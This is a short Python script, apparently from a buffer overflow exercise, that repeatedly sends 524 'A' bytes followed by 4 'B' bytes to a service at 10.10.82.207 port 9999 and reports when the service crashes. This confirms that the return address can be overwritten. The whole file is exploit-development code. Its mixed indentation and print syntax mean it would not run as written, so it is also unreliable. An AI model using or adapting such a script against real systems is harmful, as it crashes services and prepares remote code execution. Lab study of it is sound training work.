#!/usr/bin/python
import sys, socket
from time import sleep

buffer = "A" * 524 + "B" * 4

while True:
        try:
        	print('FUZZED WITH BUFFER SIZE OF ' + str(len(buffer)))
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(('10.10.82.207',9999))
                s.send((buffer))
                s.recv(1024)
                s.close()
                sleep(1)
               

        except:
                print 'FUZZING crashed at %s bytes' % str(len(buffer))
                sys.exit()
